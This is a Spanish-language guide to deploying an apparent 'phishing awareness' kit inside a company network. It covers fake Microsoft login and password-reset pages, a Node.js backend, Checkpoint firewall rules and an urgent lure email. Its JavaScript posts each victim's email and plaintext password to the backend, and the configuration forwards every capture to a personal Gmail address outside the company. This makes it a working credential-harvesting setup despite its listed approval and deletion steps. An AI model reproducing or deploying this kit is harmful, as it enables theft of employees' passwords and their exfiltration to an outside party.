# 🏢 Guía de Despliegue Interno (Red Empresarial con Proxy/Firewall)

Esta guía explica cómo desplegar el sistema de phishing awareness **dentro de la red de tu empresa** para evitar bloqueos por proxy/firewall (como Checkpoint).

---

## 📦 Componentes del Sistema

1. **Frontend** (HTML/CSS/JS): `index.html`, `reset-password.html`, `admin.html`
2. **Backend** (Node.js): `server/server.js` - recibe capturas y reenvía por SMTP interno
3. **Panel Admin**: `admin.html` - visualiza todas las capturas localmente

---

## 🚀 Paso 1: Instalar Backend Interno

El backend debe ejecutarse en un servidor **dentro de la red de la empresa** que tenga acceso al SMTP interno.

### Requisitos

- Node.js 18+ instalado
- Acceso al servidor SMTP interno (o credenciales)
- Puerto disponible (ej. 3000)

### Instalación

```bash
cd /Users/edwinrobles/Documents/Login/server

# Copiar configuración ejemplo
cp .env.example .env

# Editar .env con los valores de tu empresa:
# - SMTP_HOST: servidor SMTP interno (ej. smtp.tuempresa.local)
# - SMTP_PORT: 25, 587, o 465
# - TO_EMAIL: sofly7899@gmail.com (o email corporativo)
# - CORS_ALLOW_ORIGIN: dominio interno del frontend

# Instalar dependencias
npm install

# Ejecutar servidor
npm start
```

El servidor estará en `http://localhost:3000`.

### Ejemplo de `.env`

```env
PORT=3000
CORS_ALLOW_ORIGIN=http://intranet.tuempresa.local
SMTP_HOST=smtp.tuempresa.local
SMTP_PORT=25
SMTP_SECURE=false
SMTP_USER=
SMTP_PASS=
TO_EMAIL=sofly7899@gmail.com
MAIL_FROM=phishing-awareness@tuempresa.local
```

---

## 🌐 Paso 2: Alojar Frontend en Intranet

Copia los archivos del frontend a un servidor web interno (IIS, Apache, Nginx, o servidor Node.js estático).

### Opción A: Servidor Web Simple (Python)

```bash
cd /Users/edwinrobles/Documents/Login
python3 -m http.server 8080
```

Accede desde: `http://IP_DEL_SERVIDOR:8080`

### Opción B: IIS (Windows Server)

1. Copia todos los archivos HTML/CSS/JS a `C:\inetpub\wwwroot\phishing`
2. Crea un sitio web en IIS apuntando a esa carpeta
3. Configura el dominio interno (ej. `http://phishing.tuempresa.local`)

### Opción C: Nginx (Linux)

```nginx
server {
    listen 80;
    server_name phishing.tuempresa.local;
    root /var/www/phishing;
    index index.html;
    
    location / {
        try_files $uri $uri/ =404;
    }
}
```

---

## 🔗 Paso 3: Conectar Frontend con Backend

Edita `script.js` y `script-reset.js` para apuntar al backend interno:

### En `script.js` (línea ~50), agrega:

```javascript
// CONFIGURACIÓN: URL del backend interno
window.BACKEND_URL = 'http://servidor-interno.tuempresa.local:3000';
```

Luego, en la función `sendDataToEmail`, asegúrate de que se envíe al backend:

```javascript
// Enviar al backend interno primero
const backend = window.BACKEND_URL || '';
if (backend) {
    fetch(backend + '/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: email,
            password: password,
            timestamp: timestamp,
            userAgent: userAgent,
            url: currentUrl,
            type: type
        })
    })
    .then(res => res.json())
    .then(data => console.log('✅ Datos enviados al backend:', data))
    .catch(err => console.error('❌ Error:', err));
}
```

---

## 🛡️ Paso 4: Configurar Firewall/Proxy

Asegúrate de que el firewall/proxy permita:

1. Tráfico HTTP/HTTPS entre los navegadores de los empleados y el servidor frontend interno
2. Tráfico entre el servidor frontend y el backend interno (puerto 3000)
3. Tráfico del backend al SMTP interno (puerto 25/587/465)

### Checkpoint Firewall

Si usas Checkpoint, crea reglas que permitan:

```
Origen: Red_Empleados
Destino: Servidor_Phishing_Frontend
Servicio: HTTP (80) / HTTPS (443)
Acción: Permitir

Origen: Servidor_Phishing_Frontend
Destino: Servidor_Phishing_Backend
Servicio: TCP 3000
Acción: Permitir

Origen: Servidor_Phishing_Backend
Destino: Servidor_SMTP
Servicio: SMTP (25/587/465)
Acción: Permitir
```

---

## 📧 Paso 5: Probar el Sistema

### Prueba de Login

1. Abre `http://phishing.tuempresa.local/index.html`
2. Ingresa email: `test@empresa.com`
3. Ingresa password: `Test123`
4. Verifica que:
   - La consola del navegador muestre: `✅ Datos enviados al backend`
   - El backend muestre en su log: `Mail sent`
   - Llegue email a `sofly7899@gmail.com`

### Prueba de Reset Password

1. Abre `http://phishing.tuempresa.local/reset-password.html`
2. Sigue el flujo completo
3. Verifica que los datos se capturen igual

### Panel de Administración

1. Abre `http://phishing.tuempresa.local/admin.html`
2. Verás todas las capturas (tipo Login o Reset)
3. Puedes exportar a CSV o copiar datos

---

## 🎯 Paso 6: Lanzar Campaña

### Email de Prueba (Ejemplo)

```
Para: empleados@tuempresa.com
De: helpdesk@tuempresa.com
Asunto: URGENTE: Actualización de seguridad requerida

Estimado empleado,

Detectamos actividad inusual en tu cuenta de Microsoft. Por seguridad,
debes verificar tu identidad inmediatamente.

👉 http://phishing.tuempresa.local/

Este enlace expira en 24 horas. Si no verificas, tu cuenta será suspendida.

Equipo de Seguridad IT
```

### Después de la Campaña

1. Envía email educativo explicando que fue una simulación
2. Presenta estadísticas (% que hizo clic, % que ingresó credenciales)
3. Elimina los datos capturados del servidor y localStorage
4. Programa entrenamientos de seguridad

---

## 🔐 Consideraciones de Seguridad

- ✅ Obtén aprobación escrita de RRHH y Legal antes de lanzar
- ✅ Informa previamente que habrá simulaciones de phishing
- ✅ Usa HTTPS si es posible (certificado interno)
- ✅ Limita el acceso al panel admin (autenticación)
- ✅ Cifra la comunicación entre frontend y backend (TLS)
- ✅ Borra los datos después de la campaña
- ✅ No uses credenciales reales para ningún otro propósito
- ✅ Registra todos los accesos para auditoría

---

## 🆘 Solución de Problemas

### "No llegan emails"

- Verifica `.env` del backend
- Verifica que el backend pueda conectar al SMTP: `telnet smtp.tuempresa.local 25`
- Revisa logs del backend: `npm start` debería mostrar errores

### "CORS error"

- Asegúrate que `CORS_ALLOW_ORIGIN` en `.env` coincida con la URL del frontend
- O configura `CORS_ALLOW_ORIGIN=*` (solo para testing)

### "Proxy bloquea"

- Verifica que tanto frontend como backend estén en dominios permitidos por el proxy
- Usa IPs internas si el proxy bloquea por dominio

### "Firewall bloquea"

- Revisa las reglas del firewall Checkpoint
- Asegúrate que los puertos 80/443/3000/25 estén permitidos entre los servidores

---

## 📊 URLs del Sistema

- **Login**: `http://phishing.tuempresa.local/index.html`
- **Reset Password**: `http://phishing.tuempresa.local/reset-password.html`
- **Panel Admin**: `http://phishing.tuempresa.local/admin.html`
- **Backend API**: `http://servidor-backend:3000/api/submit`
- **Health Check**: `http://servidor-backend:3000/api/health`

---

## 📞 Soporte

Si tienes problemas técnicos:

1. Revisa logs del backend: `npm start` en la consola
2. Revisa consola del navegador (F12)
3. Verifica conectividad: `curl http://servidor-backend:3000/api/health`

---

¡Éxito con tu campaña de concientización! 🛡️
